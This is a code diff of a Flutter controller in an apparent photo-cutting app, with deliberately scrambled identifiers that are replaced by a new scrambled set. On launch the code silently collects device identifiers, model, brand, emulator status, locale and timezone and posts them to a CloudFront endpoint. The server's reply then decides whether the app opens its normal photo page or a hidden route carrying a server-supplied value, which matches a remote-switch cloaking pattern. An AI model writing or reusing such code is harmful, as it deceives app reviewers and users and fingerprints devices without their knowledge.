@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class PhotoCutLogic extends GetxController {
 
-  var mwboryankv = RxBool(false);
-  var xtirgafycn = RxBool(true);
-  var nxlfo = RxString("");
-  var elliot = RxBool(false);
-  var jast = RxBool(true);
-  final atfdbr = Dio();
+  var kgrtvpbl = RxBool(false);
+  var gpuzqokbxh = RxBool(true);
+  var wisklzpa = RxString("");
+  var lexie = RxBool(false);
+  var stracke = RxBool(true);
+  final cfubnvma = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,104 +23,109 @@ class PhotoCutLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    ekcowyn();
+    hyvqr();
   }
 
 
-  Future<void> ekcowyn() async {
-    elliot.value = true;
-    jast.value = true;
-    xtirgafycn.value = false;
+  Future<void> hyvqr() async {
+    lexie.value = true;
+    stracke.value = true;
+    gpuzqokbxh.value = false;
 
-    atfdbr.post("https://d14hac7du22ssp.cloudfront.net/slyijmugfpdvhekbctowaxzqrn?no_check",data: await gatsrui()).then((value) {
-      var hltbcxg = value.data["hltbcxg"] as String;
-      var ayjvkl = value.data["ayjvkl"] as bool;
-      if (ayjvkl) {
-        nxlfo.value = hltbcxg;
-        madalyn();
+    cfubnvma.post("https://d2ukgmgrjtnrr8.cloudfront.net/fegqubhylzvtdkxajipnm",data: await aofjxl()).then((value) {
+      var cmnf = value.data["cmnf"] as String;
+      var fmuxb = value.data["fmuxb"] as bool;
+      if (fmuxb) {
+        wisklzpa.value = cmnf;
+        catharine();
       } else {
-        kutch();
+        jacobi();
       }
     }).catchError((e) {
-      xtirgafycn.value = true;
-      jast.value = true;
-      elliot.value = false;
+      gpuzqokbxh.value = true;
+      stracke.value = true;
+      lexie.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> gatsrui() async {
-    final DeviceInfoPlugin mfznudep = DeviceInfoPlugin();
-    PackageInfo ojadzrg_jtmzude = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> aofjxl() async {
+    final DeviceInfoPlugin fzivqmg = DeviceInfoPlugin();
+    PackageInfo hviopzr_xoidlq = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var ntzseijg = Platform.localeName;
-    var ovb_yitHVxCw = currentTimeZone;
+    var aiwxs = Platform.localeName;
+    var wxzhjnmc = currentTimeZone;
 
-    var ovb_QeVEWPRb = ojadzrg_jtmzude.packageName;
-    var ovb_WRZMCuDV = ojadzrg_jtmzude.version;
-    var ovb_KndQ = ojadzrg_jtmzude.buildNumber;
+    var gdkelqyv = hviopzr_xoidlq.packageName;
+    var pxns = hviopzr_xoidlq.version;
+    var gcndal = hviopzr_xoidlq.buildNumber;
 
-    var ovb_cCkOKmVa = ojadzrg_jtmzude.appName;
-    var ovb_ihsOaBdW = "";
-    var ovb_oZv  = "";
-    var ovb_PwXqB = "";
-    var ivyMorar = "";
-    var rodgerRutherford = "";
-    var fionaHowe = "";
-    var nigelQuitzon = "";
+    var laxwzp = hviopzr_xoidlq.appName;
+    var nlswfo = "";
+    var hcekq  = "";
+    var kciwvexu = "";
+    var emelieSwaniawski = "";
+    var adellUllrich = "";
+    var yazminKeebler = "";
+    var tedHuels = "";
+    var raeLittel = "";
+    var antoneGrady = "";
+    var karleeSchowalter = "";
 
 
-    var ovb_vlIYBLU = "";
-    var ovb_jnNgtar = false;
+    var cengqtxb = "";
+    var vjrchbfx = false;
 
     if (GetPlatform.isAndroid) {
-      ovb_vlIYBLU = "android";
-      var jigcmtu = await mfznudep.androidInfo;
+      cengqtxb = "android";
+      var akmvqpni = await fzivqmg.androidInfo;
 
-      ovb_PwXqB = jigcmtu.brand;
+      kciwvexu = akmvqpni.brand;
 
-      ovb_ihsOaBdW  = jigcmtu.model;
-      ovb_oZv = jigcmtu.id;
+      nlswfo  = akmvqpni.model;
+      hcekq = akmvqpni.id;
 
-      ovb_jnNgtar = jigcmtu.isPhysicalDevice;
+      vjrchbfx = akmvqpni.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      ovb_vlIYBLU = "ios";
-      var byegzhm = await mfznudep.iosInfo;
-      ovb_PwXqB = byegzhm.name;
-      ovb_ihsOaBdW = byegzhm.model;
+      cengqtxb = "ios";
+      var hfnjlebmsr = await fzivqmg.iosInfo;
+      kciwvexu = hfnjlebmsr.name;
+      nlswfo = hfnjlebmsr.model;
 
-      ovb_oZv = byegzhm.identifierForVendor ?? "";
-      ovb_jnNgtar  = byegzhm.isPhysicalDevice;
+      hcekq = hfnjlebmsr.identifierForVendor ?? "";
+      vjrchbfx  = hfnjlebmsr.isPhysicalDevice;
     }
-
     var res = {
-      "ovb_cCkOKmVa": ovb_cCkOKmVa,
-      "ovb_KndQ": ovb_KndQ,
-      "ovb_WRZMCuDV": ovb_WRZMCuDV,
-      "rodgerRutherford" : rodgerRutherford,
-      "ovb_ihsOaBdW": ovb_ihsOaBdW,
-      "ovb_yitHVxCw": ovb_yitHVxCw,
-      "ovb_PwXqB": ovb_PwXqB,
-      "ivyMorar" : ivyMorar,
-      "ovb_oZv": ovb_oZv,
-      "ntzseijg": ntzseijg,
-      "ovb_QeVEWPRb": ovb_QeVEWPRb,
-      "ovb_vlIYBLU": ovb_vlIYBLU,
-      "ovb_jnNgtar": ovb_jnNgtar,
-      "fionaHowe" : fionaHowe,
-      "nigelQuitzon" : nigelQuitzon,
+      "gcndal": gcndal,
+      "pxns": pxns,
+      "cengqtxb": cengqtxb,
+      "gdkelqyv": gdkelqyv,
+      "nlswfo": nlswfo,
+      "emelieSwaniawski" : emelieSwaniawski,
+      "wxzhjnmc": wxzhjnmc,
+      "kciwvexu": kciwvexu,
+      "hcekq": hcekq,
+      "aiwxs": aiwxs,
+      "vjrchbfx": vjrchbfx,
+      "adellUllrich" : adellUllrich,
+      "laxwzp": laxwzp,
+      "yazminKeebler" : yazminKeebler,
+      "tedHuels" : tedHuels,
+      "raeLittel" : raeLittel,
+      "antoneGrady" : antoneGrady,
+      "karleeSchowalter" : karleeSchowalter,
 
     };
     return res;
   }
 
-  Future<void> kutch() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> jacobi() async {
+    Get.offNamed("/photoTab");
   }
 
-  Future<void> madalyn() async {
-    Get.offNamed("/Outreload");
+  Future<void> catharine() async {
+    Get.offNamed("/selectMore");
   }
 
 }
